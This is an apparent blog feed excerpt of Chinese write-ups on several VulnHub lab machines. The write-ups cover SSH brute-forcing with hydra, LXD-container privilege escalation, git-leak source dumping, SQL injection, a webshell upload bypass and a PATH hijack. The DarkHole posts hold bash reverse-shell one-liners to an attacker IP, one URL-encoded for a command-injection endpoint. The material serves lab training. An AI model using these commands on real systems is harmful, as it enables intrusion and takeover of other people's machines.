    <link href="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-27T12:01:23.000Z</published>
    <updated>2022-06-28T02:41:45.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a><br>靶机:172.16.17.156<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫描靶机,22端口filtered,80正常开发,apache<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png"></p><p>访问首页看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png"></p><p>没有功能点,扫下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272044678.png"></p><p>挨个访问,有两个txt文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272053867.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272054740.png"><br>一个字典<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272055221.png"></p><p>一串密文,base64解出为10000,暂时不知道什么意思,继续往下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272057190.png"></p><p>在网页源码里看到了注释,得到提示,还有一个登录口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272048590.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, </span></span><br><span class="line"><span class="comment">and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- “jubiscleudo，请不要忘记在退出部门时激活端口敲门，并告诉老板不要忘记批准.jpg文件-dev_suport@hackable3.com&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>得到一个用户名和一个邮箱,结合上面的端口扫描,应该是提示需要碰撞打开22端口</p><p>访问登录口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272100696.png"></p><p>尝试利用上面的字典爆破,无果<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272105700.png"></p><p>在登录页的源码里翻到一个地址<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272110189.png"></p><p>进一步扫描目录,.php结尾的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272111295.png"></p><p>挨个访问,爆出了源码和数据库密码,但是数据库端口并不对外开放<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272112979.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272113138.png"></p><p>login.php中提到一个3.jpg,直接访问看看<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272125744.png"></p><p>没有任何提示和利用的地方,想到隐写,把图片下载下来 进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://172.16.17.156/3.jpg ./</span><br><span class="line">steghide --extract -sf 3.jpg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272134681.png"></p><p>得到提示,porta:65535,前面得到一个10000,应该是knock使用碰撞ssh端口,但是还差一个,继续翻前面爆破出的目录</p><p>翻到一个2.txt<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140728.png"></p><p>熟悉的ctf加密方式<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140818.png"></p><p>解密 <a href="http://www.hiencode.com/brain.html">http://www.hiencode.com/brain.html</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272142726.png"></p><p>得到三个端口号 65535 10000 4444</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="碰撞ssh打开端口"><a href="#碰撞ssh打开端口" class="headerlink" title="碰撞ssh打开端口"></a>碰撞ssh打开端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 172.16.17.156 -v 10000 4444 65535</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280958059.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280959656.png"></p><h2 id="爆破ssh"><a href="#爆破ssh" class="headerlink" title="爆破ssh"></a>爆破ssh</h2><p>使用上面拿到的用户名和字典,爆破ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 172.16.17.156 ssh </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281006417.png"></p><p>登录账号,找到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281012148.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>没有sudo权限的文件,在网站目录下翻到一个隐藏文件,提示我们mysql root用户没有密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281015482.png"></p><p>尝试登录mysql发现根本没有这个服务<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281017369.png"></p><p>回到上面的隐藏文件,发现给出一个账号密码,在家目录翻的时候,恰好有一个hackable_3用户的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;hackable_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TrOLLED_3&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281020151.png"></p><p>登录成功,但是没有任何可利用的地方<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281023340.png"></p><p>查阅其他师傅的文章,发现在lxd组中,lxd和docker一样,一种容器<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281028117.png"></p><p>利用lxd容器提权,思路是将容器的目录映射到root目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281039098.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281037956.png"></p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">提权方法</a> 使用第二种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build a simple alpine image</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">sed -i <span class="string">&#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27;</span> build-alpine</span><br><span class="line">sudo ./build-alpine -a i686</span><br><span class="line"></span><br><span class="line"><span class="comment"># import the image</span></span><br><span class="line">lxc image import ./alpine*.tar.gz --<span class="built_in">alias</span> myimage <span class="comment"># It&#x27;s important doing this from YOUR HOME directory on the victim machine, or it might fail.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># before running the image, start and configure the lxd storage pool as default </span></span><br><span class="line">lxd init</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the image</span></span><br><span class="line">lxc init myimage mycontainer -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mount the /root into the image</span></span><br><span class="line">lxc config device add mycontainer mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># interact with the container</span></span><br><span class="line">lxc start mycontainer</span><br><span class="line">lxc <span class="built_in">exec</span> mycontainer /bin/sh</span><br></pre></td></tr></table></figure><p>在&#x2F;mnt&#x2F;root&#x2F;root下拿到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281041068.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/hackable-iii,720/&quot;&gt;https://www.vulnhub.com/entry/hackable-iii,720/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.156&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫描靶机,22端口filtered,80正常开发,apache&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问首页看看&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ftp" scheme="https://syst1m.top/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>hackable:2打靶</title>
    <link href="https://syst1m.top/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-27T07:44:44.000Z</published>
    <updated>2022-06-27T12:00:56.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/darkhole-2,740/">https://www.vulnhub.com/entry/darkhole-2,740/</a><br>靶机:172.16.17.155<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描,开放了21,22,80,存在Anonymous用户<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png"></p><p>网站就一个apache首页<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>回到ftp使用Anonymous用户登录,密码为任意邮箱,<a href="mailto:&#x31;&#x32;&#51;&#64;&#x31;&#50;&#51;&#46;&#99;&#x6f;&#109;">&#x31;&#x32;&#51;&#64;&#x31;&#50;&#51;&#46;&#99;&#x6f;&#109;</a><br>发现存在一个html文件下载下来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271932686.png"></p><p>打开,查看源代码,title有一串可疑字符,和一句提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271934487.png"></p><p>没有利用的点,回到网站,扫一下目录,扫到一个files<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271938467.png"></p><p>打开发现一个CALL.html,和ftp上的一模一样<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271939684.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271939512.png"></p><p>猜测ftp目录和web目录为同一个,利用ftp上传webshell试试<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271941357.png"></p><p>访问存在,上蚁剑<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271944032.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用蚁剑反弹一个shell到kali<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271947654.png"></p><p>翻家目录,翻到一个txt,提示我们运行一个sh脚本,运行之后出来一串密文<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271949779.png"></p><p>尝试解密onion,应该是shrek的密码,和最开始的html标题一样…<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271950204.png"></p><p>ssh登录上来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271953098.png"></p><p>查看拥有sudo权限的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271954027.png"></p><p>有python,直接写shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271958787.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-2,740/&quot;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.155&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描,开放了21,22,80,存在Anonymous用户&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;网站就一个apache首页&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ftp" scheme="https://syst1m.top/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-darkhole:2打靶</title>
    <link href="https://syst1m.top/2022/06/25/vulnhub-darkhole-2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/25/vulnhub-darkhole-2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-25T12:52:23.000Z</published>
    <updated>2022-06-25T14:56:37.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/darkhole-2,740/">https://www.vulnhub.com/entry/darkhole-2,740/</a><br>靶机:172.16.17.154<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap 扫描靶机<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png"></p><p>访问一下首页,看看web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png"></p><p>首页只有一个登录功能, nmap扫到一个.git目录,继续扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252103052.png"></p><p>config和.git挨个访问,都存在目录遍历和git泄露<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252104899.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252108851.png"></p><p>信息收集到此结束</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="获取git源码"><a href="#获取git源码" class="headerlink" title="获取git源码"></a>获取git源码</h2><p>脚本地址 <a href="https://github.com/lijiejie/GitHack/">https://github.com/lijiejie/GitHack/</a></p><p>用脚本下载源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://172.16.17.154/.git/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252140311.png"></p><p>查看一下目录结构<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252141979.png"></p><p>得到数据库账号密码,但是并未对外开放数据库端口<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252142189.png"></p><p>审计几个php文件,没有收获</p><h2 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h2><p>递归下载目录<br>脚本地址 <a href="https://github.com/arthaud/git-dumper">https://github.com/arthaud/git-dumper</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_dumper.py http://172.16.17.154/.git website</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252152596.png"></p><p>审计日志<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252154557.png"></p><p>第一次为初始化,第二次added login.php,第三次changed login.php</p><p>第二次添加了默认凭据</p><pre><code> I added login.php file with default credentials</code></pre><p>继续跟进,查看两次的差异</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff a4d900a8d85e8938d3601f3cef113ee293028e10</span><br></pre></td></tr></table></figure><p>拿到账号密码,同时看到sql语句<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252207747.png"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>登录成功,看到id字眼,结合上面看到的sql语句,此处存在sql注入<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252209727.png"></p><p>修改id为0时,内容消失<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252213507.png"></p><p>1&#x3D;1回显正常<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252217059.png"></p><p>1&#x3D;2无回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252217080.png"></p><p>丢sqlmap跑,需要带上cookie<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252223888.png"></p><p>在数据库中跑出ssh密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252229820.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252231283.png"></p><p>拿到第一个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252232348.png"></p><p>提权信息收集<br>sudo -l没有<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252234087.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252234966.png"></p><p>在历史命令翻到可疑记录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252236595.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252236339.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://localhost:999/?cmd=id&quot;</span> </span><br><span class="line">curl <span class="string">&quot;http://localhost:9999/?cmd=id&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=ls -la&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=ls%20-la&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~&amp;ls&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~&amp;&amp;ls&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=cd%20~||ls&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看来存在命令执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252238693.png"></p><p>发现,是losy用户,反弹一个shell,需要注意的是,因为是url执行,所以需要url编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://127.0.0.1:9999/?cmd=bash%20-c%20&#x27;exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F172.16.17.140%2F4444%20%3C%261&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252251755.png"></p><p>历史命令看到密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252250920.png"></p><p>ssh上losy用户查看sudo权限的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252252937.png"></p><p>根据历史命令的提示,用python拿到一个shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252255400.png"></p><p>拿到最后的flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206252256615.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-2,740/&quot;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.154&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap 扫描靶机&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问一下首页,看看web指纹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="信息泄露" scheme="https://syst1m.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-darkhole:1打靶</title>
    <link href="https://syst1m.top/2022/06/24/vulnhub-darkhole:1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/24/vulnhub-darkhole:1%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-24T09:18:07.000Z</published>
    <updated>2022-06-24T14:55:30.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub项目 <a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a><br>靶机:172.16.17.153<br>攻击机kali:172.16.17.140</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫一下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png"></p><p>插件看到web指纹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png"></p><p>扫一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241829627.png"></p><p>config目录存在目录遍历,下载不下来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241830409.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>注册一个账号看看,在注册的时候,用户名使用admin,报用户或者邮箱存在,应该存在一个admin账号,继续往下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241827069.png"></p><p>登录进去,发现可以修改密码,同时url处看到id&#x3D;2<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242147073.png"></p><p>修改id为1,提示没有权限,那么此处应该存在越权<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242148896.png"></p><p>抓包修改密码的数据包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242151674.png"></p><p>修改id参数<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242153137.png"></p><p>退出test账号,使用admin登录,登录成功,出现一个上传点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242155345.png"></p><h2 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h2><p>上传一句话发现有限制<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242158827.png"></p><p>传一个.php3后缀的试试,发现可以上传,虽然不被解析,但起码说明并不是白名单<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242156017.png"></p><p>前面得到服务器为apache,尝试apache解析漏洞,抓包慢慢fuzz<br>最后使用.phtml成功绕过,<a href="https://syst1m.top/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">中间件解析漏洞</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242215173.png"></p><p>看一下最开始信息收集的那个database.php,得到数据库账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242227736.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>蚁剑反弹一个交互式shell到kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/172.16.17.140/4444 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242219996.png"></p><p>在家目录下翻到一个john用户,存在root权限的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242229612.png"></p><p>运行发现是以john用户执行了id命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242230601.png"></p><p>思路:我们可以自己构造一个id命令写入shell,替换掉原来的环境变量到这我们构造的id命令下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/id; <span class="built_in">chmod</span> +x /tmp/id; <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242235087.png"></p><p>在john家目录下得到flag和john的密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242243076.png"></p><p>ssh得到一个完全交互式shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242244133.png"></p><p>看一下sudo执行的文件<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242252290.png"></p><p>写入反弹shell的python语句<br>这里要注意,要使用绝对路径去执行file.py,否则会报权限不够<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206242253772.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub项目 &lt;a href=&quot;https://www.vulnhub.com/entry/darkhole-1,724/&quot;&gt;https://www.vulnhub.com/entry/darkhole-1,724/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.153&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫一下&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;插件看到web指纹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="越权" scheme="https://syst1m.top/tags/%E8%B6%8A%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>sql注入之mysql注入姿势及绕过总结</title>
    <link href="https://syst1m.top/2022/06/24/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://syst1m.top/2022/06/24/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2022-06-24T05:37:14.000Z</published>
    <updated>2022-06-30T05:26:45.691Z</updated>
    
